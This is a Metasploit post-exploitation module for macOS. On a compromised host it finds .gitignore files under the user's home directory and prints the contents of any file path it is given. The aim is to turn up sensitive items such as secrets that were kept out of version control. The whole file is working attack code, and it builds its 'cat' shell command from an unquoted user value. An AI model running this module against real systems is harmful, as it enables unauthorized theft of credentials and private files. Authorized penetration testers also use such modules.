class MetasploitModule < Msf::Post
  include Msf::Post::File
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Git Ignore Retriever',
        'Description' => %q{
          This module finds potentially sensitive items by finding .gitignore files.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'N!ght Jmp'],
        'Platform' => [ 'osx' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ]
      )
 )
    register_options([
      OptString.new('MODE', [false, 'Gitignore retrieval modes: 1). Find gitignore file locations. 2). Retrieve specific gitignore/file contents', '']),
      OptString.new('FILE', [false, 'Filepath of gitignore/file to retrieve (For mode 2)', ''])
    ])
  end

  def run
    mode = datastore['MODE'].to_i
    file = datastore['FILE']
    if mode == 1
      print_status('Fetching .gitignore files')
      gitlist = cmd_exec('find ~ -name ".gitignore" 2>/dev/null').chomp
      for ignore in gitlist.split
        print_good(ignore.to_s)
      end
    elsif mode == 2
      if !file.to_s.empty?
        gitignore = cmd_exec("cat #{file}").chomp
        print_good(file.to_s)
        print_good(gitignore.to_s)
      else
        print_error('Please set the FILE path!')
      end
    end
  end
end
